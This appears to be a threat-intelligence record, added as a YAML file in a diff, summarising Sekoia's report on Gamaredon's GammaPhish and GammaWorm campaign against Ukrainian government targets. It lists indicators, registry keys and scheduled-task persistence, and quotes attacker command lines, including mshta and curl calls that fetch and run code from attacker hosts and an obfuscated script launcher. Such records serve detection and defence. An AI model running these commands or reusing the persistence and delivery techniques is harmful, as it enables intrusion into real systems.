@@ -1,0 +1,138 @@
+title: 'FSB''s matryoshka #1/3 — GammaPhish and GammaWorm'
+description: Gamaredon (aka Primitive Bear) conducted a long-term campaign against
+  Ukrainian government targets using a fileless, VBScript-driven modular architecture
+  abusing NTFS Alternate Data Streams, Dead Drop Resolvers, and legitimate cloud infrastructure
+  for C2 communication. The campaign features GammaPhish and GammaWorm components
+  with heavy obfuscation and USB propagation.
+attribution: Gamaredon (aka ACTINUM, Armageddon, UAC-0010, BlueAlpha)
+malware_families:
+- GammaPhish
+- GammaWorm
+- GammaLoad
+- GammaSteel
+- GammaWipe
+- Pteranodon
+- LitterDrifter
+- PowerPunch
+- QuietSieve
+cves:
+- CVE-2025-8088
+- CVE-2018-20250
+ttps:
+  processes:
+  - mshta.exe
+  - wscript.exe
+  - curl.exe
+  command_lines:
+  - '%WINDIR%\system32\mshta.exe hxxps://www.bbc.com@iiwdsxwamylbwwsoyrmj.supabase.co/functions/v1/clever-responder/GurGoogle_09.12.2025/audience/capture.pdf'
+  - mshta.exe "javascript:eval('function f(x){return x.split("").reverse().join("");};s=f("nur");y=f("llehS.tpircSW");w=new
+    ActiveXObject(y);window["w"][s]("explorer [FOLDER_PATH]");window["w"][s]("wscript.exe
+    ~.gif //b //e:vbScript ");window.close()')"
+  - wscript.exe ~.gif //b //e:vbScript
+  - curl.exe hxxps://www.telegram.me/s/oberfarir -o C:\Users\[USER]\AppData\Local\Temp\cancelH0S.mpg
+  - wscript.exe "C:\Users\[USER]:GTR"
+  powershell:
+  - Get-Item -Stream *
+  scripts:
+  - VBScript blob comprising approximately 90% junk and obfuscated code instantiating
+    WScript.Shell to execute mshta.exe
+  - VBScript module stored in C:\Users\[USER]:URL ADS performing Dead Drop Resolver
+    C2 resolution
+  - VBScript module stored in C:\Users\[USER]:LNK ADS performing propagation and infection
+  - VBScript module stored in C:\Users\[USER]:SERVER ADS cloning DiskDiagnosticDataCollector
+    functionality
+  - WScript.Shell.ExpandEnvironmentStrings("%computername%")
+  - Hex(FileSystemObject.GetDrive("C:").SerialNumber)
+  registry_keys:
+  - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\ExplorerGuard
+  - HKCU\Console\WindowsUpdates
+  - HKCU\Console\WindowsResponby
+  - HKCU\Console\WindowsDetect
+  - HKCU\Console\WindowsTelegra
+  image_loads: []
+  network_connections:
+  - mshta.exe -> iiwdsxwamylbwwsoyrmj.supabase[.]co:443
+  - curl.exe -> www.telegram[.]me/s/oberfarir:443
+  - wscript.exe -> supabase[.]co:443
+  - wscript.exe -> graph[.]org:443
+  - wscript.exe -> workers[.]dev:443
+  - wscript.exe -> teletype[.]in:443
+  - wscript.exe -> telegra[.]ph:443
+  - wscript.exe -> t[.]me:443
+  - wscript.exe -> 104.194.140[.]6:443
+  file_activity:
+  - _2_14_6_1033_09.12.2025.pdf
+  - 2_14_6_1033_09.12.2025.rar
+  - 1_13_5_1691_09.12.2025.xhtml
+  - '%USERPROFILE%:GTR'
+  - '%USERPROFILE%:save'
+  - '%USERPROFILE%:URL'
+  - '%USERPROFILE%:LNK'
+  - '%USERPROFILE%:SERVER'
+  - '%USERPROFILE%\boot.ini'
+  - C:\Users\[USER]\AppData\Local\Temp\cancelH0S.mpg
+  - ~.gif
+  persistence:
+  - HTA file extracted via WinRAR path traversal (CVE-2025-8088) to user Startup directory
+    for execution on next login
+  - GammaWorm establishes persistence via scheduled tasks
+  - GammaWorm conceals core modules within NTFS Alternate Data Streams (ADS)
+  - Registry RunOnce key HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\ExplorerGuard
+    executes C:\Users\[USER]:GTR via wscript.exe
+  - Scheduled task DiskDiagnosticDataCollector created under \DiskDiagnostic\Microsoft\Windows\
+    executing every 7 minutes running C:\Users\[USER]:URL ADS
+  - Scheduled task SilentCleanup created under \CertificateServicesClient\SystemTask\
+    executing every 7 minutes running C:\Users\[USER]:LNK ADS
+  - Scheduled task SmartRetry created under \InstallService\ScanForUpdatesServer\
+    executing every 10 minutes running C:\Users\[USER]:SERVER ADS
+  - GammaWorm copies itself to %USERPROFILE%:GTR ADS or falls back to %USERPROFILE%\boot.ini
+  - Startup folder persistence via HTA file drop
+  - Propagation via USB drives and network shares by dropping ~.gif and replacing
+    directories with malicious LNK files
+  - Registry RunOnce key HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\ExplorerGuard
+    used to launch GammaWorm on user logon
+  - Scheduled task \DiskDiagnostic\Microsoft\Windows\DiskDiagnosticDataCollector
+  - Scheduled task \CertificateServicesClient\SystemTask
+  - Scheduled task \SilentCleanup\InstallService
+  - Scheduled task \ScanForUpdatesServer\SmartRetry
+  - NTFS Alternate Data Streams (ADS) used to store hidden modules
+  process_relations:
+  - WScript.Shell -> mshta.exe
+  - mshta.exe -> wscript.exe
+iocs:
+  hashes:
+  - 1794369214b7f62e70a0485e61335c61
+  - 8e1624d110c090ff57d4b493a9107c66
+  ip_addresses:
+  - 104.194.140[.]6
+  domains:
+  - iiwdsxwamylbwwsoyrmj.supabase[.]co
+  - graph[.]org
+  - telegra[.]ph
+  - teletype[.]in
+  - quitethepastry[.]ru
+  - bold.zsjtn41091.workers[.]dev
+  - moment-cat-qld-place.trycloudflare[.]com
+  - t[.]me
+  - www.telegram[.]me
+  - efficiency-planes-emotions-fascinating.trycloudflare[.]com
+  - supabase[.]co
+  - workers[.]dev
+  urls:
+  - hxxp://iiwdsxwamylbwwsoyrmj.supabase[.]co/functions/v1/clever-responder/KokonGoogle_09.12.2025
+  - hxxps://www.bbc.com@iiwdsxwamylbwwsoyrmj.supabase.co/functions/v1/clever-responder/GurGoogle_09.12.2025/audience/capture.pdf
+  - hxxps://graph[.]org/kyjfkyr-12-06
+  - hxxps://bold.zsjtn41091.workers[.]dev
+  - hxxps://teletype[.]in/@myrain/Xh1Lta2Ccro
+  - hxxps://quitethepastry[.]ru
+  - hxxps://telegra[.]ph/f8bfl6sp-01-02
+  - hxxps://moment-cat-qld-place.trycloudflare[.]com/sylvilagus
+  - hxxps://www.telegram[.]me/s/oberfarir
+  - hxxps://efficiency-planes-emotions-fascinating.trycloudflare[.]com/@myrain/Xh1Lta2Ccro?84wtj9ob-01-31
+  - hxxps:/t[.]me/s/teotori
+  - hxxps://www.telegram[.]me/s/oberfari
+authors:
+- Sekoia TDR
+reference: https://blog.sekoia.io/fsbs-matryoshka-1-3-gamaredons-gifts-that-keeps-unpacking-gammaphish-and-gammaworm/
+date_of_publication: June 01, 2026
+file_creation_date: June 01, 2026
